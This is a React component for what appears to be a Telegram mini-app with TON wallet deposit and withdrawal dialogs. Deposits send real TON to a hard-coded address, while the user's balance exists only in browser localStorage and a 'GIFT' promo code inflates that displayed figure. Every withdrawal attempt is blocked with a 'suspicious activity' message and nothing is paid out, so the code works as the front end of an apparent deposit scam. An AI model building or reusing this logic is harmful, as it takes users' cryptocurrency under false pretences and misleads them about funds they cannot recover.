import { Plus, Minus, Wallet } from "lucide-react";
import { Button } from "@/components/ui/button";
import tonLogo from "@assets/toncoin_1760893904370.png";
import { useTelegramUser } from "@/hooks/use-telegram-user";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { useState, useEffect } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useToast } from "@/hooks/use-toast";
import { useTonConnectUI, useTonAddress, useTonWallet } from '@tonconnect/ui-react';

export default function TopHeader() {
  const { username, avatarLetter } = useTelegramUser();
  const { language, t } = useLanguage();
  const { toast } = useToast();
  const [tonConnectUI] = useTonConnectUI();
  const userFriendlyAddress = useTonAddress();
  const wallet = useTonWallet();
  const [isDepositOpen, setIsDepositOpen] = useState(false);
  const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
  const [depositAmount, setDepositAmount] = useState("");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [promoCode, setPromoCode] = useState("");
  const [balance, setBalance] = useState(0);
  const [depositAddress] = useState("UQAb0o8lRX_dZvl2NL6pInxbSjixvdrCf_G4KdqYRCgIjDz1");

  useEffect(() => {
    const savedBalance = localStorage.getItem('userBalance');
    if (savedBalance) {
      setBalance(parseFloat(savedBalance));
    }
  }, []);

  const handleDeposit = async () => {
    if (!wallet) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Подключите кошелёк TON" : "Connect TON wallet first",
        variant: "destructive",
      });
      tonConnectUI.openModal();
      return;
    }

    const amount = parseFloat(depositAmount);
    if (!amount || amount < 0.05) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Минимальная сумма депозита: 0.05 TON" : "Minimum deposit: 0.05 TON",
        variant: "destructive",
      });
      return;
    }

    let finalAmount = amount;
    let bonusApplied = false;
    if (promoCode.trim().toUpperCase() === "GIFT") {
      finalAmount = amount * 1.15;
      bonusApplied = true;
    }

    const amountInNanotons = Math.floor(amount * 1_000_000_000).toString();

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 360,
      messages: [
        {
          address: depositAddress,
          amount: amountInNanotons,
        }
      ]
    };

    try {
      const result = await tonConnectUI.sendTransaction(transaction);
      console.log('Transaction sent:', result);
      
      const newBalance = balance + finalAmount;
      setBalance(newBalance);
      localStorage.setItem('userBalance', newBalance.toString());
      
      if (bonusApplied) {
        toast({
          title: t.toast.success,
          description: `${amount} TON + 15% ${language === 'ru' ? 'бонус' : 'bonus'} = ${finalAmount.toFixed(2)} TON`,
        });
      } else {
        toast({
          title: t.toast.success,
          description: `${language === 'ru' ? 'Депозит успешно отправлен' : 'Deposit sent successfully'}: ${amount} TON`,
        });
      }
      
      setIsDepositOpen(false);
      setDepositAmount("");
      setPromoCode("");
    } catch (error) {
      console.error('Transaction failed:', error);
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Транзакция отменена или не удалась" : "Transaction cancelled or failed",
        variant: "destructive",
      });
    }
  };

  const handleWithdraw = () => {
    const amount = parseFloat(withdrawAmount);
    if (!amount || amount < 0.05) {
      toast({
        title: t.toast.error,
        description: language === 'ru' ? "Минимальная сумма вывода: 0.05 TON" : "Minimum withdrawal: 0.05 TON",
        variant: "destructive",
      });
      return;
    }

    toast({
      title: t.profile.suspiciousActivity,
      description: t.profile.withdrawalBlocked,
      variant: "destructive",
    });
    setIsWithdrawOpen(false);
    setWithdrawAmount("");
  };

  return (
    <>
      <header className="sticky top-0 z-50 flex items-center justify-between px-3 sm:px-4 py-3 sm:py-4 bg-background/95 backdrop-blur-sm">
        <div className="flex items-center gap-2 sm:gap-3" data-testid="text-title">
          <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
            <span className="text-sm sm:text-base font-bold text-white">{avatarLetter}</span>
          </div>
          <span className="text-base sm:text-lg font-semibold text-foreground">{username}</span>
        </div>

        <div className="flex items-center gap-2 sm:gap-3">
          {!wallet ? (
            <Button
              size="sm"
              onClick={() => tonConnectUI.openModal()}
              className="px-3 py-2 h-9 rounded-full bg-blue-600 hover:bg-blue-700 text-sm font-semibold gap-1.5 shadow-lg"
              data-testid="button-connect-wallet"
            >
              <Wallet className="w-4 h-4" />
              <span>{language === 'ru' ? 'Підключити' : 'Connect Wallet'}</span>
            </Button>
          ) : (
            <>
              <div className="flex items-center gap-1.5 sm:gap-2 px-2.5 sm:px-4 py-1.5 sm:py-2 rounded-full bg-primary/10 border border-primary/20" data-testid="display-balance">
                <img src={tonLogo} alt="TON" className="w-5 h-5 sm:w-6 sm:h-6 rounded-full object-cover" />
                <span className="text-xs sm:text-sm font-semibold text-foreground">{balance.toFixed(2)} TON</span>
              </div>
              <Button
                size="icon"
                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-green-600 hover:bg-green-700 active-elevate-2 shadow-md"
                data-testid="button-deposit"
                onClick={() => setIsDepositOpen(true)}
              >
                <Plus className="w-4 h-4 text-white" />
              </Button>
              <Button
                size="icon"
                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full bg-red-600 hover:bg-red-700 active-elevate-2 shadow-md"
                data-testid="button-withdraw"
                onClick={() => setIsWithdrawOpen(true)}
              >
                <Minus className="w-4 h-4 text-white" />
              </Button>
            </>
          )}
        </div>
      </header>

      <Dialog open={isDepositOpen} onOpenChange={setIsDepositOpen}>
        <DialogContent className="bg-background border-0 rounded-3xl p-0 overflow-hidden max-w-sm">
          <div className="bg-gradient-to-br from-green-600 to-emerald-600 px-6 pt-8 pb-6">
            <DialogTitle className="text-white text-2xl font-bold mb-2">{t.profile.depositTitle}</DialogTitle>
            <p className="text-white/80 text-sm">{language === 'ru' ? 'Пополните баланс' : 'Add funds to balance'}</p>
          </div>
          
          <div className="p-6 space-y-6">
            <div>
              <div className="relative">
                <Input
                  type="number"
                  step="0.01"
                  min="0.05"
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  placeholder="0.00"
                  className="h-16 text-3xl font-bold text-center border-0 bg-muted/30 focus-visible:ring-2 focus-visible:ring-green-500 rounded-2xl pr-16"
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                  <img src={tonLogo} alt="TON" className="w-6 h-6 rounded-full" />
                  <span className="text-sm font-medium text-muted-foreground">TON</span>
                </div>
              </div>
              <p className="text-xs text-muted-foreground text-center mt-2">{language === 'ru' ? 'Минимум 0.05 TON' : 'Minimum 0.05 TON'}</p>
            </div>

            <div>
              <Input
                type="text"
                value={promoCode}
                onChange={(e) => setPromoCode(e.target.value.toUpperCase())}
                placeholder={language === 'ru' ? 'Промокод (опционально)' : 'Promo code (optional)'}
                className="h-12 bg-muted/30 border-0 focus-visible:ring-2 focus-visible:ring-green-500 rounded-xl text-center uppercase"
              />
              {promoCode.toUpperCase() === "GIFT" && (
                <div className="mt-2 p-2 bg-green-500/10 rounded-lg">
                  <p className="text-xs text-green-600 text-center font-medium">
                    ✓ {language === 'ru' ? '+15% бонус' : '+15% bonus'}
                  </p>
                </div>
              )}
            </div>

            <div className="grid grid-cols-2 gap-3">
              <Button
                variant="outline"
                onClick={() => {
                  setIsDepositOpen(false);
                  setDepositAmount("");
                  setPromoCode("");
                }}
                className="h-12 rounded-xl border-2"
              >
                {t.profile.cancel}
              </Button>
              <Button
                onClick={handleDeposit}
                className="h-12 rounded-xl bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 shadow-lg"
              >
                {wallet ? t.profile.confirm : (language === 'ru' ? 'Подключить' : 'Connect')}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={isWithdrawOpen} onOpenChange={setIsWithdrawOpen}>
        <DialogContent className="bg-background border-0 rounded-3xl p-0 overflow-hidden max-w-sm">
          <div className="bg-gradient-to-br from-red-600 to-orange-600 px-6 pt-8 pb-6">
            <DialogTitle className="text-white text-2xl font-bold mb-2">{t.profile.withdrawTitle}</DialogTitle>
            <p className="text-white/80 text-sm">{language === 'ru' ? 'Доступно: ' : 'Available: '}{balance.toFixed(2)} TON</p>
          </div>
          
          <div className="p-6 space-y-6">
            <div>
              <div className="relative">
                <Input
                  type="number"
                  step="0.01"
                  min="0.05"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                  placeholder="0.00"
                  className="h-16 text-3xl font-bold text-center border-0 bg-muted/30 focus-visible:ring-2 focus-visible:ring-red-500 rounded-2xl pr-16"
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                  <img src={tonLogo} alt="TON" className="w-6 h-6 rounded-full" />
                  <span className="text-sm font-medium text-muted-foreground">TON</span>
                </div>
              </div>
              <p className="text-xs text-muted-foreground text-center mt-2">{language === 'ru' ? 'Минимум 0.05 TON' : 'Minimum 0.05 TON'}</p>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <Button
                variant="outline"
                onClick={() => {
                  setIsWithdrawOpen(false);
                  setWithdrawAmount("");
                }}
                className="h-12 rounded-xl border-2"
              >
                {t.profile.cancel}
              </Button>
              <Button
                onClick={handleWithdraw}
                className="h-12 rounded-xl bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-700 hover:to-orange-700 shadow-lg"
              >
                {t.profile.confirm}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
}